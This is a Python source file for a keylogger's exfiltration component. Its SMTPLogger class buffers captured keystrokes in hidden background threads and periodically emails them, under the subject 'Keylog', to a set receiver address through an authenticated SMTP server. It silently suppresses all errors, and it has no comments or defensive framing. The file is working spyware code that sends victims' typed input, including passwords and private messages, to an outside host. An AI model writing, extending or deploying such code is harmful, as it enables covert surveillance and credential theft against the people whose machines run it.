import smtplib
import datetime
import threading
from queue import Queue
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time

class SMTPLogger:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password, 
                 receiver_email, buffer_size=100, send_interval=60):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
        self.buffer_size = buffer_size
        self.send_interval = send_interval
        
        self.queue = Queue()
        self.buffer = []
        self.lock = threading.Lock()
        self.running = True
        
        self.buffer_thread = threading.Thread(target=self._buffer_worker, daemon=True)
        self.sender_thread = threading.Thread(target=self._sender_worker, daemon=True)
        self.buffer_thread.start()
        self.sender_thread.start()
        
        self.last_send_time = time.time()

    def log_keystroke(self, key):
        self.queue.put(key)

    def _buffer_worker(self):
        while self.running:
            try:
                key = self.queue.get(timeout=1)
                with self.lock:
                    self.buffer.append(key)
                    if len(self.buffer) >= self.buffer_size:
                        self._trigger_send()
            except:
                pass

    def _sender_worker(self):
        while self.running:
            try:
                time.sleep(1)
                if time.time() - self.last_send_time >= self.send_interval:
                    with self.lock:
                        if self.buffer:
                            self._trigger_send()
            except:
                pass

    def _trigger_send(self):
        if not self.buffer:
            return
        try:
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.receiver_email
            msg['Subject'] = f"Keylog - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            body = ''.join(self.buffer)
            msg.attach(MIMEText(body, 'plain'))
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)
            
            self.buffer.clear()
            self.last_send_time = time.time()
        except:
            pass

    def stop(self):
        self.running = False
        with self.lock:
            if self.buffer:
                self._trigger_send()
        self.buffer_thread.join(timeout=2)
        self.sender_thread.join(timeout=2)
